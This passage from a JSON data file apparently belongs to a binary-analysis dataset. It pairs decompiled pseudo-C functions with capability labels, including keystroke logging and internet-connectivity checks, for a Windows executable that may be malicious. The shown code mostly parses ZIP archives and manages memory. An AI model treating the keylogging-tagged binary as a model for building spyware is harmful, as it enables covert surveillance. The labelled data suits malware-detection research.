arg_ch_00, 1, *arg_8h),  iVar2 != 1)) {\n                iVar3 = -1;\n            }\n            var_38h = var_38h - arg_ch_00;\n            if (iVar3 != 0) goto code_r0x00407fc0;\n        }\n        if (arg_1ch != 0) {\n            var_4h = var_34h;\n            if (arg_20h <= var_34h) {\n                var_4h = arg_20h;\n            }\n            if (var_38h != 0) {\n                pcVar1 = *arg_8h;\n                if (*pcVar1 == '\\0') {\n                    *(pcVar1 + 0x1c) = *(pcVar1 + 0x1c) + var_38h;\n                    var_38h = 0;\n                }\n                else if (pcVar1[1] == '\\0') {\n                    iVar3 = -1;\n                }\n                else {\n                    (**0x469108)(*(pcVar1 + 4), var_38h, 0, 1);\n                    var_38h = 0;\n                }\n            }\n            if (((var_34h != 0) && (arg_20h != 0)) && (iVar2 = fcn.004078b0(arg_1ch, var_4h, 1, *arg_8h),  iVar2 != 1))\n            {\n                iVar3 = -1;\n            }\n            iVar2 = var_38h + (var_34h - var_4h);\n            goto code_r0x00407fc3;\n        }\n    }\ncode_r0x00407fc0:\n    iVar2 = var_38h + var_34h;\ncode_r0x00407fc3:\n    if (iVar3 == 0) {\n        if (arg_24h != 0) {\n            if (var_30h < arg_28h) {\n                *(var_30h + arg_24h) = 0;\n                var_4h = var_30h;\n            }\n            else {\n                var_4h = arg_28h;\n            }\n            if (iVar2 != 0) {\n                pcVar1 = *arg_8h;\n                if (*pcVar1 == '\\0') {\n                    *(pcVar1 + 0x1c) = *(pcVar1 + 0x1c) + iVar2;\n                }\n                else if (pcVar1[1] == '\\0') {\n                    iVar3 = -1;\n                }\n                else {\n                    (**0x469108)(*(pcVar1 + 4), iVar2, 0, 1);\n                }\n            }\n            if (((var_30h != 0) && (arg_28h != 0)) && (iVar2 = fcn.004078b0(arg_24h, var_4h, 1, *arg_8h),  iVar2 != 1))\n            {\n                return -1;\n            }\n            if (iVar3 != 0) {\n                return iVar3;\n            }\n        }\n        if (arg_ch != NULL) {\n            puVar4 = &var_58h;\n            for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *arg_ch = *puVar4;\n                puVar4 = puVar4 + 1;\n                arg_ch = arg_ch + 1;\n            }\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = var_8h;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 2212
    },
    "004080d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004080d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        return -0x66;\n    }\n    if ((*(arg_8h + 0x18) != 0) && (iVar1 = *(arg_8h + 0x10) + 1,  iVar1 != *(arg_8h + 4))) {\n        *(arg_8h + 0x14) = *(arg_8h + 0x14) + *(arg_8h + 0x50) + *(arg_8h + 0x4c) + 0x2e + *(arg_8h + 0x48);\n        *(arg_8h + 0x10) = iVar1;\n        iVar1 = fcn.00407d00(arg_8h, arg_8h + 0x28, arg_8h + 0x78, 0, 0, 0, 0, 0, 0);\n        *(arg_8h + 0x18) = iVar1 == 0;\n        return iVar1;\n    }\n    return -100;\n}\n",
        "token_count": 272
    },
    "00408140": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_110h\n\nvoid __cdecl fcn.00408140(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    if ((arg_8h != 0) && (uVar2 = fcn.0042b420(arg_ch),  uVar2 < 0x100)) {\n        if (*(arg_8h + 0x18) == 0) {\n            fcn.0042ad2a(var_110h);\n            return;\n        }\n        arg_8h_00 = *(arg_8h + 0x10);\n        uVar1 = *(arg_8h + 0x14);\n        iVar3 = fcn.00408080(arg_8h);\n        while( true ) {\n            if (iVar3 != 0) {\n                *(arg_8h + 0x10) = arg_8h_00;\n                *(arg_8h + 0x14) = uVar1;\n                fcn.0042ad2a(arg_8h_00);\n                return;\n            }\n            fcn.00407d00(arg_8h, 0, 0, &var_108h, 0x100, 0, 0, 0, 0);\n            if (arg_10h == 1) {\n                iVar3 = fcn.0042c1a0(&var_108h);\n            }\n            else {\n                iVar3 = fcn.00407ad0(&var_108h, arg_ch);\n            }\n            if (iVar3 == 0) break;\n            iVar3 = fcn.004080d0(arg_8h);\n        }\n        fcn.0042ad2a(arg_8h_00);\n        return;\n    }\n    fcn.0042ad2a(var_110h);\n    return;\n}\n",
        "token_count": 493
    },
    "00408250": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408250(char **arg_8h, int32_t *arg_ch, char **arg_10h, uint *arg_14h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    char **ppcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    ppcVar3 = arg_8h;\n    iVar5 = 0;\n    *arg_ch = 0;\n    *arg_10h = NULL;\n    *arg_14h = 0;\n    pcVar1 = *arg_8h;\n    if (*pcVar1 == '\\0') {\n        *(pcVar1 + 0x1c) = arg_8h[3] + arg_8h[0x1e];\n    }\n    else {\n        if (pcVar1[1] == '\\0') {\n            return -1;\n        }\n        (**0x469108)(*(pcVar1 + 4), arg_8h[3] + arg_8h[0x1e] + *(pcVar1 + 0xc), 0, 0);\n    }\n    iVar4 = fcn.004079d0(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if (arg_8h != 0x4034b50) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407930(*ppcVar3, &arg_8h);\n    if (iVar4 != 0) {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407930(*ppcVar3, &var_4h);\n    if (iVar4 != 0) {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407930(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if ((iVar5 == 0) && ((ppcVar2 = ppcVar3[0xd],  arg_8h != ppcVar2 || ((ppcVar2 != NULL && (ppcVar2 != 0x8)))))) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.004079d0(*ppcVar3, &arg_8h);\n    if (iVar4 != 0) {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.004079d0(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if (((iVar5 == 0) && (arg_8h != ppcVar3[0xf])) && ((var_4h & 8) == 0)) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.004079d0(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if (((iVar5 == 0) && (arg_8h != ppcVar3[0x10])) && ((var_4h & 8) == 0)) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.004079d0(*ppcVar3, &arg_8h);\n    if (iVar4 == 0) {\n        if (((iVar5 == 0) && (arg_8h != ppcVar3[0x11])) && ((var_4h & 8) == 0)) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    iVar4 = fcn.00407930(*ppcVar3, &arg_8h);\n    ppcVar2 = arg_8h;\n    if (iVar4 == 0) {\n        if ((iVar5 == 0) && (arg_8h != ppcVar3[0x12])) {\n            iVar5 = -0x67;\n        }\n    }\n    else {\n        iVar5 = -1;\n    }\n    *arg_ch = *arg_ch + arg_8h;\n    iVar4 = fcn.00407930(*ppcVar3, &arg_8h);\n    if (iVar4 != 0) {\n        iVar5 = -1;\n    }\n    *arg_10h = ppcVar3[0x1e] + 0x1e + ppcVar2;\n    *arg_14h = arg_8h;\n    *arg_ch = *arg_ch + arg_8h;\n    return iVar5;\n}\n",
        "token_count": 1086
    },
    "00408430": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408430(int32_t arg_8h)\n\n{\n    int32_t *arg_8h_00;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (arg_8h == 0) {\n        return 0xffffff9a;\n    }\n    arg_8h_00 = *(arg_8h + 0x7c);\n    if (arg_8h_00 == NULL) {\n        return 0xffffff9a;\n    }\n    if ((arg_8h_00[0x17] == 0) && (arg_8h_00[0x14] != arg_8h_00[0x15])) {\n        var_4h = 0xffffff97;\n    }\n    if (*arg_8h_00 != 0) {\n        fcn.0042aeff(*arg_8h_00);\n        *arg_8h_00 = 0;\n    }\n    *arg_8h_00 = 0;\n    if (arg_8h_00[0x10] != 0) {\n        fcn.00407690(arg_8h_00 + 1);\n    }\n    arg_8h_00[0x10] = 0;\n    fcn.0042aeff(arg_8h_00);\n    *(arg_8h + 0x7c) = 0;\n    return var_4h;\n}\n",
        "token_count": 320
    },
    "00408bf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408bf0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    if (arg_8h == NULL) {\n        *0x458684 = 0x10000;\n        return;\n    }\n    if (*arg_8h != 1) {\n        *0x458684 = 0x80000;\n        return;\n    }\n    *0x458684 = fcn.00408b10(arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 138
    },
    "00408c40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00408c40(int32_t *arg_8h)\n\n{\n    if (arg_8h == NULL) {\n        return 0;\n    }\n    return arg_8h & 0xffffff00 | *arg_8h == 1;\n}\n",
        "token_count": 63
    },
    "00409ca0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00409ca0(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    if (((arg_8h != NULL) && (arg_8h[7] != NULL)) && (*arg_8h != 0)) {\n        uVar1 = *arg_8h[7];\n        if (uVar1 < 0xe) {\n    // WARNING (jumptable): Sanity check requires truncation of jumptable\n            switch(*(uVar1 * 4 + 0x409424)) {\n            case 0x1b9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb08c783:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1045c7c2:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x11b60ffc:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1b840f00:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x29000006:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x4d8bf84d:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xe2d3cf8b:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xf87d8300:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xfc4d0100:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        return 0xfffffffe;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 452
    },
    "0040a060": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040a060(char *arg_8h)\n\n{\n    char *arg_8h_00;\n    int32_t iVar1;\n    uint *arg_8h_01;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    char *var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    iVar3 = 0;\n    if (arg_8h == NULL) {\n        return NULL;\n    }\n    var_88h = NULL;\n    fcn.0042acb0(&var_84h, 0, 0x7c);\n    var_6ch = fcn.00407b30(arg_8h_00);\n    if (var_6ch == -1) {\ncode_r0x0040a0d7:\n        iVar3 = -1;\n    }\n    else {\n        if (*arg_8h_00 == '\\0') {\n            *(arg_8h_00 + 0x1c) = var_6ch;\n        }\n        else {\n            if (arg_8h_00[1] == '\\0') goto code_r0x0040a0d7;\n            (**0x469108)(*(arg_8h_00 + 4), *(arg_8h_00 + 0xc) + var_6ch, 0, 0);\n        }\n        iVar1 = fcn.004079d0(arg_8h_00, &arg_8h);\n        if (iVar1 != 0) goto code_r0x0040a0d7;\n    }\n    var_4h = 0;\n    if (iVar3 == 0) {\n        iVar1 = fcn.00407930(arg_8h_00, &var_4h);\n        if (iVar1 != 0) {\n            iVar3 = -1;\n        }\n    }\n    var_8h = 0;\n    if (iVar3 == 0) {\n        iVar1 = fcn.00407930(arg_8h_00, &var_8h);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00407930(arg_8h_00, &var_84h);\n            if (iVar1 == 0) goto code_r0x0040a12c;\n        }\n        iVar3 = -1;\n    }\ncode_r0x0040a12c:\n    arg_8h = NULL;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00407930(arg_8h_00, &arg_8h);\n        if ((((iVar3 == 0) && (arg_8h == var_84h)) && (var_8h == 0)) && (var_4h == 0)) {\n            iVar3 = fcn.004079d0(arg_8h_00, &var_68h);\n            if (iVar3 == 0) {\n                iVar3 = fcn.004079d0(arg_8h_00, &var_64h);\n                if (iVar3 == 0) {\n                    iVar3 = fcn.00407930(arg_8h_00, &var_80h);\n                    if (iVar3 == 0) {\n                        if (var_68h + var_64h <= *(arg_8h_00 + 0xc) + var_6ch) {\n                            var_7ch = ((*(arg_8h_00 + 0xc) - var_68h) - var_64h) + var_6ch;\n                            var_88h = arg_8h_00;\n                            var_ch = 0;\n                            *(arg_8h_00 + 0xc) = 0;\n                            arg_8h_01 = fcn.0042ae6b(0x80);\n                            puVar2 = &var_88h;\n                            puVar4 = arg_8h_01;\n                            for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                *puVar4 = *puVar2;\n                                puVar2 = puVar2 + 1;\n                                puVar4 = puVar4 + 1;\n                            }\n                            fcn.00408080(arg_8h_01);\n                            return arg_8h_01;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (arg_8h_00[0x10] != '\\0') {\n        (**0x4690f0)(*(arg_8h_00 + 4));\n    }\n    fcn.0042ac49(arg_8h_00);\n    return NULL;\n}\n",
        "token_count": 1107
    },
    "0040a210": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a210(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == NULL) {\n        return 0xffffff9a;\n    }\n    if (arg_8h[0x1f] != 0) {\n        fcn.00408430(arg_8h);\n    }\n    iVar1 = *arg_8h;\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x10) != '\\0') {\n            (**0x4690f0)(*(iVar1 + 4));\n        }\n        fcn.0042ac49(iVar1);\n    }\n    fcn.0042aeff(arg_8h);\n    return 0;\n}\n",
        "token_count": 169
    },
    "0040a3e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a3e0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uchar *arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    uchar uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    if (arg_8h == 0) {\n        return -0x66;\n    }\n    piVar3 = *(arg_8h + 0x7c);\n    if (piVar3 == NULL) {\n        return -0x66;\n    }\n    if (*piVar3 != 0) {\n        if (arg_10h == 0) {\n            return 0;\n        }\n        piVar3[4] = arg_ch;\n        piVar3[5] = arg_10h;\n        if (piVar3[0x17] < arg_10h) {\n            piVar3[5] = piVar3[0x17];\n        }\n        if (piVar3[5] != 0) {\n            do {\n                if ((piVar3[2] == 0) && (uVar9 = piVar3[0x16],  uVar9 != 0)) {\n                    uVar7 = 0x4000;\n                    if ((uVar9 < 0x4000) && (uVar7 = uVar9,  uVar9 == 0)) {\n                        if (arg_14h != NULL) {\n                            *arg_14h = 1;\n                        }\n                        return 0;\n                    }\n                    pcVar4 = piVar3[0x18];\n                    if (*pcVar4 == '\\0') {\n                        *(pcVar4 + 0x1c) = piVar3[0x1a] + piVar3[0xf];\n                    }\n                    else {\n                        if (pcVar4[1] == '\\0') {\n                            return -1;\n                        }\n                        (**0x469108)(*(pcVar4 + 4), *(pcVar4 + 0xc) + piVar3[0x1a] + piVar3[0xf], 0, 0);\n                    }\n                    iVar6 = fcn.004078b0(*piVar3, uVar7, 1, piVar3[0x18]);\n                    if (iVar6 != 1) {\n                        return -1;\n                    }\n                    iVar6 = *piVar3;\n                    piVar3[0xf] = piVar3[0xf] + uVar7;\n                    piVar3[0x16] = piVar3[0x16] - uVar7;\n                    piVar3[1] = iVar6;\n                    piVar3[2] = uVar7;\n                    if ((*(piVar3 + 0x1b) != '\\0') && (uVar9 = 0,  uVar7 != 0)) {\n                        do {\n                            uVar5 = fcn.00407450(piVar3 + 0x1c, *(uVar9 + iVar6));\n                            *(uVar9 + iVar6) = uVar5;\n                            uVar9 = uVar9 + 1;\n                        } while (uVar9 < uVar7);\n                    }\n                }\n                uVar9 = piVar3[2];\n                uVar7 = piVar3[0x1f];\n                if (uVar9 < piVar3[0x1f]) {\n                    uVar7 = uVar9;\n                }\n                if (uVar7 != 0) {\n                    cVar2 = *(piVar3[1] + uVar7 + -1);\n                    piVar3[0x17] = piVar3[0x17] - uVar7;\n                    piVar1 = piVar3 + 0x1f;\n                    *piVar1 = *piVar1 - uVar7;\n                    piVar3[2] = uVar9 - uVar7;\n                    piVar3[1] = piVar3[1] + uVar7;\n                    if ((*piVar1 == 0) && (cVar2 != *(piVar3 + 0x20))) {\n                        return -0x6a;\n                    }\n                }\n                if (piVar3[0x19] == 0) {\n                    uVar9 = piVar3[2];\n                    if (piVar3[5] < piVar3[2]) {\n                        uVar9 = piVar3[5];\n                    }\n                    uVar7 = 0;\n                    if (uVar9 != 0) {\n                        do {\n                            *(uVar7 + piVar3[4]) = *(uVar7 + piVar3[1]);\n                            uVar7 = uVar7 + 1;\n                        } while (uVar7 < uVar9);\n                    }\n                    iVar6 = piVar3[4];\n                    iVar8 = fcn.004072f0(piVar3[0x14], iVar6, uVar9);\n                    piVar3[0x17] = piVar3[0x17] - uVar9;\n                    piVar3[2] = piVar3[2] - uVar9;\n                    piVar3[5] = piVar3[5] - uVar9;\n                    piVar3[1] = piVar3[1] + uVar9;\n                    piVar3[6] = piVar3[6] + uVar9;\n                    var_4h = var_4h + uVar9;\n                    piVar3[0x14] = iVar8;\n                    piVar3[4] = iVar6 + uVar9;\n                    if ((piVar3[0x17] == 0) && (arg_14h != NULL)) {\n                        *arg_14h = 1;\n                    }\n                }\n                else {\n                    iVar6 = piVar3[4];\n                    iVar8 = piVar3[6];\n                    var_8h = fcn.00409ca0(piVar3 + 1, 2);\n                    iVar8 = piVar3[6] - iVar8;\n                    iVar6 = fcn.004072f0(piVar3[0x14], iVar6, iVar8);\n                    piVar3[0x17] = piVar3[0x17] - iVar8;\n                    var_4h = var_4h + iVar8;\n                    piVar3[0x14] = iVar6;\n                    if ((var_8h == 1) || (piVar3[0x17] == 0)) {\n                        if (arg_14h == NULL) {\n                            return var_4h;\n                        }\n                        *arg_14h = 1;\n                        return var_4h;\n                    }\n                    if (var_8h != 0) {\n                        return var_8h;\n                    }\n                }\n            } while (piVar3[5] != 0);\n            if (var_8h != 0) {\n                return var_8h;\n            }\n        }\n        return var_4h;\n    }\n    return -100;\n}\n",
        "token_count": 1640
    },
    "0040a650": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a650(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX != 0) || (in_ECX[1] != -1)) {\n        return 0x1000000;\n    }\n    (**0x4690d0)(0x103, in_ECX + 0x50);\n    iVar2 = fcn.0042b420(in_ECX + 0x50);\n    iVar3 = arg_10h;\n    cVar1 = *(iVar2 + 0x13f + in_ECX);\n    if ((cVar1 != '\\\\') && (cVar1 != '/')) {\n        *(in_ECX + iVar2 + 0x140) = 0x2f;\n    }\n    if (arg_10h == 1) {\n        iVar2 = (**0x469108)(arg_8h, 0, 0, 1);\n        if (iVar2 == -1) {\n            return 0x2000000;\n        }\n    }\n    iVar3 = fcn.004077a0(arg_8h, arg_ch, iVar3, &arg_10h);\n    if (iVar3 == 0) {\n        return arg_10h;\n    }\n    iVar3 = fcn.0040a060(iVar3);\n    *in_ECX = iVar3;\n    return (-(iVar3 != 0) & 0xfffffe00) + 0x200;\n}\n",
        "token_count": 361
    },
    "0040af80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040af80(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_8h == NULL) {\n        *0x458684 = 0x10000;\n        return;\n    }\n    if (*arg_8h != 1) {\n        *0x458684 = 0x80000;\n        return;\n    }\n    *0x458684 = fcn.0040a720(arg_ch, arg_10h, arg_14h, 3);\n    return;\n}\n",
        "token_count": 130
    },
    "0040afd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040afd0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    \n    if (arg_8h == NULL) {\n        *0x458684 = 0x10000;\n        return 0x10000;\n    }\n    if (*arg_8h != 1) {\n        *0x458684 = 0x80000;\n        return 0x80000;\n    }\n    piVar1 = arg_8h[1];\n    if (piVar1[1] != -1) {\n        fcn.00408430(*piVar1);\n    }\n    piVar1[1] = -1;\n    if (*piVar1 != 0) {\n        fcn.0040a210(*piVar1);\n    }\n    *piVar1 = 0;\n    *0x458684 = 0;\n    if (piVar1[0x4e] != 0) {\n        fcn.0042c228(piVar1[0x4e]);\n    }\n    piVar1[0x4e] = 0;\n    if (piVar1[0x4f] != 0) {\n        fcn.0042c228(piVar1[0x4f]);\n    }\n    piVar1[0x4f] = 0;\n    fcn.0042ac49(piVar1);\n    fcn.0042ac49(arg_8h);\n    return *0x458684;\n}\n",
        "token_count": 330
    },
    "0040b3d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b3d0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    arg_8h_00 = 7;\n    var_29h._0_1_ = 0;\n    var_34h = 0;\n    iVar1 = (**0x4692a8)(arg_8h, 7, 0, 0, &var_34h);\n    if ((((iVar1 == 0) && (iVar1 = (**0x469220)(),  uVar3 = var_34h,  iVar1 == 0x7a)) &&\n        (iVar1 = fcn.0042ae6b(var_34h),  iVar1 != 0)) &&\n       (iVar2 = (**0x4692a8)(arg_8h, 7, iVar1, uVar3, &var_34h),  iVar2 != 0)) {\n        var_38h = 0;\n        uVar3 = (**0x4692d4)(0x2000e, &var_38h);\n        iVar2 = (**0x469168)(uVar3);\n        if (iVar2 != 0) {\n            var_30h = 0;\n            iVar2 = (**0x4691d4)(var_38h, 2, &var_30h);\n            if (iVar2 != 0) {\n                var_24h = 0;\n                var_20h = 0;\n                var_1ch = 0;\n                var_18h = 0;\n                stack0xffffffd4 = 0;\n                var_40h = 0;\n                var_44h = 0x14;\n                var_3ch = 0;\n                var_14h = 0x120089;\n                var_10h = 0x120116;\n                var_ch = 0x1200a0;\n                var_8h = 0x1f01ff;\n                (**0x469280)(&arg_ch, &var_14h);\n                iVar2 = (**0x4690f8)(iVar1, var_30h, arg_ch, &var_14h, &var_29h + 1, &var_44h, &var_40h, &var_3ch);\n                if (iVar2 != 0) {\n                    var_29h._0_1_ = var_3ch == 1;\n                }\n                (**0x4690f0)(var_30h);\n            }\n            (**0x4690f0)(var_38h);\n        }\n        fcn.0042aeff(iVar1);\n    }\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 770
    },
    "0040b8d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b8d0(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint *in_ECX;\n    \n    if (arg_ch == 1) {\n        if (0xf < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        *(in_ECX + arg_8h) = arg_10h;\n        return;\n    }\n    if (0xf < in_ECX[5]) {\n        in_ECX = *in_ECX;\n    }\n    fcn.0042acb0(in_ECX + arg_8h, arg_10h, arg_ch);\n    return;\n}\n",
        "token_count": 153
    },
    "0040bcc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
